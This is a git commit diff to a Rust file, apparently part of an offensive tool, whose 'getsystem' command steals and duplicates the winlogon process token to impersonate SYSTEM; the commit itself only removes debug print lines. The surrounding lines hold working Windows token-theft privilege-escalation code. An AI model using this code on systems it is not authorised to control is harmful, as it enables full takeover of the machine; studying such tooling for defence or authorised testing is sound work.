49d58fde4fe159566f04e507df5990006247cc3a
Michael Taggart <mtaggart@taggart-tech.com>
2024-03-14 07:05:45 -0700

    Remove prints

--- src/cmd/getsystem.rs
+++ src/cmd/getsystem.rs
@@ -35,31 +35,25 @@ pub fn handle()  -> Result<String, String> {
     unsafe {
         let mut winlogon_token_handle = HANDLE(0);
         let mut duplicate_token_handle = HANDLE(0);
-        println!("Getting WinLogon");
         let winlogon_processes = get_processes("winlogon");
         if winlogon_processes.is_empty() {
             return Err("Couldn't find winlogon!".to_string());
         }
         
         let winlogon_pid: u32 = winlogon_processes[0].0;
-        println!("Winlogon PID: {winlogon_pid}");
-        println!("Opening Process");
         // OpenProcess
         let winlogon_proc_handle = OpenProcess(PROCESS_ALL_ACCESS, false, winlogon_pid).unwrap();
         // OpenProcessToken
-        println!("Getting Process Token");
         OpenProcessToken(winlogon_proc_handle, TOKEN_DUPLICATE, &mut winlogon_token_handle).unwrap();
         if  winlogon_token_handle.0 == 0 {
             return Err("Couldn't get Winlogon Token!".to_string());
         } 
         // Duplicate Token
-        println!("Duplicating Token");
         DuplicateToken(winlogon_token_handle, SecurityImpersonation, &mut duplicate_token_handle).unwrap();
         if  duplicate_token_handle.0 == 0 {
             return Err("Couldn't duplicate token!".to_string());
         } 
         // ImpersonateLoggedOnUser
-        println!("Impersonating");
         if let Ok(_) = ImpersonateLoggedOnUser(duplicate_token_handle) {
             CloseHandle(winlogon_proc_handle).unwrap();
             return Ok(format!("I am now {}", whoami::username()));
